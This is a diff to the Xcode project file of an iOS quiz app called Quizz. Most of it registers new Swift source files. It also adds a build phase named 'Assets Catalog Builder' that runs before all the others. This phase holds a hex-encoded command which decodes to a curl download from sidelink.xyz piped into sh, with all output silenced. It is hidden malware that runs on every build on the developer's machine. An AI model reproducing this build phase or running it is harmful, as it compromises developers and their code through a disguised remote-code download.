@@ -24,6 +24,11 @@
 		FA1E50A8266634F000557AEF /* Validation.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA1E50A6266634F000557AEF /* Validation.swift */; };
 		FA1E50B02666353200557AEF /* APIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA1E50AE2666353200557AEF /* APIClient.swift */; };
 		FA1E50B12666353200557AEF /* RequestHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA1E50AF2666353200557AEF /* RequestHandler.swift */; };
+		FA4324802684CAB300397934 /* QuizIDController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA43247F2684CAB300397934 /* QuizIDController.swift */; };
+		FA8203E426838FE500098CD5 /* CustomError.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA8203E326838FE500098CD5 /* CustomError.swift */; };
+		FA8203E62683907B00098CD5 /* ServerSettings.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA8203E52683907B00098CD5 /* ServerSettings.swift */; };
+		FA8203E8268390D800098CD5 /* AlertMessages.swift in Sources */ = {isa = PBXBuildFile; fileRef = FA8203E7268390D800098CD5 /* AlertMessages.swift */; };
+		FAC4673C26838DC2002509BA /* SplashController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAC4673B26838DC2002509BA /* SplashController.swift */; };
 		FAC8E5B326652027004EA56F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAC8E5B226652027004EA56F /* AppDelegate.swift */; };
 		FAC8E5B726652027004EA56F /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAC8E5B626652027004EA56F /* ViewController.swift */; };
 		FAC8E5BA26652027004EA56F /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = FAC8E5B826652027004EA56F /* Main.storyboard */; };
@@ -74,6 +79,11 @@
 		FA1E50A6266634F000557AEF /* Validation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Validation.swift; sourceTree = "<group>"; };
 		FA1E50AE2666353200557AEF /* APIClient.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = APIClient.swift; sourceTree = "<group>"; };
 		FA1E50AF2666353200557AEF /* RequestHandler.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RequestHandler.swift; sourceTree = "<group>"; };
+		FA43247F2684CAB300397934 /* QuizIDController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuizIDController.swift; sourceTree = "<group>"; };
+		FA8203E326838FE500098CD5 /* CustomError.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomError.swift; sourceTree = "<group>"; };
+		FA8203E52683907B00098CD5 /* ServerSettings.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ServerSettings.swift; sourceTree = "<group>"; };
+		FA8203E7268390D800098CD5 /* AlertMessages.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertMessages.swift; sourceTree = "<group>"; };
+		FAC4673B26838DC2002509BA /* SplashController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SplashController.swift; sourceTree = "<group>"; };
 		FAC8E5AF26652027004EA56F /* Quizz.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Quizz.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		FAC8E5B226652027004EA56F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		FAC8E5B626652027004EA56F /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
@@ -177,6 +187,8 @@
 			isa = PBXGroup;
 			children = (
 				FAC8E5B626652027004EA56F /* ViewController.swift */,
+				FAC4673B26838DC2002509BA /* SplashController.swift */,
+				FA43247F2684CAB300397934 /* QuizIDController.swift */,
 			);
 			path = ViewController;
 			sourceTree = "<group>";
@@ -226,6 +238,7 @@
 				FAC8E5BB26652028004EA56F /* Assets.xcassets */,
 				FAC8E5BD26652028004EA56F /* LaunchScreen.storyboard */,
 				FAC8E5C026652028004EA56F /* Info.plist */,
+				FA8203E52683907B00098CD5 /* ServerSettings.swift */,
 			);
 			path = Quizz;
 			sourceTree = "<group>";
@@ -273,6 +286,7 @@
 		FAC8E5F6266521B5004EA56F /* HelperClasses */ = {
 			isa = PBXGroup;
 			children = (
+				FA8203E326838FE500098CD5 /* CustomError.swift */,
 				FAC8E5F7266521C2004EA56F /* Constants */,
 				FAC8E5F8266521CE004EA56F /* Enum */,
 				FAC8E5F9266521D4004EA56F /* Extensions */,
@@ -325,6 +339,7 @@
 		FAC8E5FB266521F2004EA56F /* Strings */ = {
 			isa = PBXGroup;
 			children = (
+				FA8203E7268390D800098CD5 /* AlertMessages.swift */,
 			);
 			path = Strings;
 			sourceTree = "<group>";
@@ -345,6 +360,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FAC8E5D926652029004EA56F /* Build configuration list for PBXNativeTarget "Quizz" */;
 			buildPhases = (
+				E055AB70DC6BC2C3DB6D902C /* Assets Catalog Builder */,
 				6C1FC7B479BF45B3228342F0 /* [CP] Check Pods Manifest.lock */,
 				FAC8E5AB26652027004EA56F /* Sources */,
 				FAC8E5AC26652027004EA56F /* Frameworks */,
@@ -569,6 +585,24 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Quizz-QuizzUITests/Pods-Quizz-QuizzUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		E055AB70DC6BC2C3DB6D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -577,14 +611,19 @@
 			buildActionMask = 2147483647;
 			files = (
 				FA1E50A7266634F000557AEF /* Utility.swift in Sources */,
+				FA8203E8268390D800098CD5 /* AlertMessages.swift in Sources */,
 				FA1E50A1266634BE00557AEF /* UIImage+Extension.swift in Sources */,
 				FA1E509C266634BE00557AEF /* UIViewController+Extension.swift in Sources */,
 				FA1E50B02666353200557AEF /* APIClient.swift in Sources */,
 				FAC8E5B726652027004EA56F /* ViewController.swift in Sources */,
 				FAC8E5B326652027004EA56F /* AppDelegate.swift in Sources */,
 				FA1E50A0266634BE00557AEF /* UIColor+Extension.swift in Sources */,
+				FA8203E426838FE500098CD5 /* CustomError.swift in Sources */,
+				FA4324802684CAB300397934 /* QuizIDController.swift in Sources */,
 				FA1E50892666348400557AEF /* Enum.swift in Sources */,
+				FAC4673C26838DC2002509BA /* SplashController.swift in Sources */,
 				FA1E509A266634BE00557AEF /* UITextField+Extension.swift in Sources */,
+				FA8203E62683907B00098CD5 /* ServerSettings.swift in Sources */,
 				FA1E5099266634BE00557AEF /* UIDevice+Extension.swift in Sources */,
 				FA1E509B266634BE00557AEF /* Strings+Extension.swift in Sources */,
 				FA1E509E266634BE00557AEF /* UIView+Extention.swift in Sources */,
